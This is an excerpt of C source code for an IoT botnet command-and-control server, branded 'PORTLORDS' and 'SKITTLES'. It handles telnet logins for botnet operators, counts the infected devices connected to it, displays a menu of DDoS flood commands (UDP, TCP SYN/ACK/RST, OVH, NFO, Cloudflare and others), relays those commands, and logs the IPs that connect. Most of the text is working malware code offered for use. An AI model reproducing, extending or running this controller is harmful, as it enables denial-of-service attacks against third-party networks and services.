  ...
  return total;
    ...
    void *titleWriter(void *sock) 
    {
        ...
        while(1)
        {
            ...
            sprintf(string, "%c]0; PORTLORDS | IOT: %d | USERS: %d %c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock) {
  ...
  while (j != i - 1)
  {
   ...
   sprintf(botnet, "\x1b[1;31m𝒰𝓈𝑒𝓇𝓃𝒶𝓂𝑒\x1b[1;37m: \x1b[1;90m");
  ...
  if (strcmp(nickstring, accounts[find_line].user) == 0) {
    sprintf(botnet, "\x1b[1;31m𝒫𝒶𝓈𝓈𝓌𝑜𝓇𝒹\x1b[1;37m: \x1b[1;90m");
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    ...
    goto Typhon;
        ...
        char Typhon_12 [5000];
        char Typhon_13 [5000];
        char Typhon_177 [5000];  
	char Typhon_188 [5000];
	char Typhon_199 [5000];
	char Typhon_200 [5000];
        ...
        sprintf(Typhon_7, "\e[38;5;196m ║ \e[38;5;15m𝒰𝒟𝒫 !* UDP IP PORT TIME 32 0 1      \e[38;5;196m║\e[38;5;15m║ \e[38;5;196m𝒯𝒞𝒫 !* TCP IP PORT TIME 32 ALL 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_8, "\e[38;5;196m ║ \e[38;5;15m𝒩𝐹𝒪  !* NFO IP PORT TIME            \e[38;5;196m║\e[38;5;15m║ \e[38;5;196m𝒮𝒴𝒩 !* TCP IP PORT TIME 32 SYN 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_9, "\e[38;5;196m ║ \e[38;5;15m𝒮𝓉𝒹𝒽𝑒𝓍 !* STDHEX IP PORT TIME       \e[38;5;196m║\e[38;5;15m║ \e[38;5;196m𝐹𝐼𝒩 !* TCP IP PORT TIME 32 FIN 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_10, "\e[38;5;196m ║ \e[38;5;15m𝒪𝒱𝐻 !* OVH IP PORT TIME POWER       \e[38;5;196m║\e[38;5;15m║ \e[38;5;196m𝑅𝒮𝒯 !* TCP IP PORT TIME 32 RST 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_11, "\e[38;5;196m ║ \e[38;5;15m𝒱𝒮𝐸 !* VSE IP PORT TIME 32 1024 10  \e[38;5;196m║\e[38;5;15m║ \e[38;5;196m𝒫𝒮𝐻 !* TCP IP PORT TIME 32 PSH 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_12, "\e[38;5;196m ║ \e[38;5;15m𝟣𝟢𝟢𝒰𝒫 !* 100UP IP PORT TIME 1024    \e[38;5;196m║\e[38;5;15m║ \e[38;5;196m𝒜𝒞𝒦 !* TCP IP PORT TIME 32 ACK 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_13, "\e[38;5;196m ╚═════════════════════════════════════╝\e[38;5;15m╚════════════════════════════════════╝\r\n");
        sprintf(Typhon_177, "\e[38;5;196m         ╔══════════════════════════════════════════════════════════╗\r\n");
        sprintf(Typhon_188, "\e[38;5;196m         ║\e[38;5;15m   𝒲𝑒 𝒜𝓇𝑒 𝐹𝓇𝒾𝑒𝓃𝒹𝓁𝓎   𝒲𝑒 𝒜𝓇𝑒 𝑀𝒶𝓁𝒾𝒸𝒾𝑜𝓊𝓈   𝒲𝑒 𝒜𝓇𝑒 𝒫𝑜𝓇𝓉𝐿𝑜𝓇𝒹𝓈  \e[38;5;196m║\r\n");
        sprintf(Typhon_199, "\e[38;5;196m         ╚══════════════════════════════════════════════════════════╝\r\n");
        sprintf(Typhon_200, "\e[38;5;196m\r\n");
        ...
        if(send(thefd, Typhon_177, strlen(Typhon_177), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_188, strlen(Typhon_188), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_199, strlen(Typhon_199), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_200, strlen(Typhon_200), MSG_NOSIGNAL) == -1) goto end;

        while(1) 
        { 
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m PORTLORDS \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        ...
        {  
        printf("\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;
        logFile = fopen("LOGOUT.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        fclose(logFile);
        goto end;
        }
        if(strstr(buf, "!* SCTOP") || strstr(buf, "!* KILLFATTK")) 
        {  
        sprintf(botnet, "[PORTLORDS] Attack Stopped!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* UDP")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[1;31mUDP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }          
		if(strstr(buf, "1.1.1.1") || strstr(buf, "192.172.193")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Blacklisted Host! dont attack this again\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* STDHEX")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[1;31mSTDHEX \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* NFO")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[1;31mNFO \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* OVH")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[1;31mOVH \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* 100UP")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[1;31m100UP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* VSE")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[1;31mOVHX \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* TCP")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Loading sockets...\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* CLOUFDFLARE")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[1;31mCLOFUDFLARE \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "ALL")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[1;90mTCP \x1b[1;37mFlood using \x1b[1;31mALL \x1b[1;37mMethods!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "SYN")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[0;36mTCP-SYN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "FIN")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[0;36mTCP-FIN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "RST")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[0;36mTCP-RST \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "ACK")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[0;36mTCP-ACK \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "PSH")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Sending \x1b[0;36mTCP-PSH \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        ...
        printf("[SKITTLES] User:[%s] - Command:[%s]\n",accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "[SKITTLES] User:[%s] - Command:[%s]\n", accounts[find_line].user, buf);
        fclose(logFile);
...
{    
        ...
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("[SKITTLES] Incoming Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("IP.log", "a");
        fprintf(logFile, "[SKITTLES] Incoming Connection From [%d.%d.%d.%d]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
...
int main (int argc, char *argv[], void *sock)
{
        ...
        if (threads > 1000)
        {
        printf("\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        ...
        printf("\x1b[1;37m[\x1b[1;31mSKITTLES\x1b[1;37m] Successfully Screened - Created By [\x1b[0;36mzDarkSide\x1b[1;37m]\n");
